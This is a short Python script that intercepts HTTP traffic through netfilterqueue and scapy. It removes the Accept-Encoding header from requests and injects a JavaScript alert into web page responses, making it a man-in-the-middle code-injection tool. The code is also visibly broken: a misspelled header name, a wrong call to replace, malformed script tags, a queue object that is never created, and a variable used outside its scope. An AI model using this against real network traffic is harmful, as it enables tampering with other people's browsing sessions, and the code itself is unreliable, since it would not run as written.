#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load): 
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.IP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        
        if scapy_packet[scapy.TCP].dport == 80:
            
            print("[+] request")
            load = re.sub("Accep-encoding:.*?\\r\\n","",load) ## this is a use for regex rule for nothing to replace this is not zibrish the code. use the pythex online tool for this is working.
            
            
            
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] response")
            print(scapy_packet.show())
            load = scapy_packet[scapy.Raw].load.replace("</body>","</script> ","alert('test'); <script/><body/>") ## this is a replace the html code to javascript code.
            
    if load != scapy_packet[scapy.Raw].load: ## this is a housekepping use only one statement not two.
        new_packet = set_load(scapy_packet,load)
        packet.set_payload(str(new_packet))
             
            

            

    packet.accept()

queue = netfilterqueue.NetfilterQueue
queue.bind(0, process_packet)
queue.run()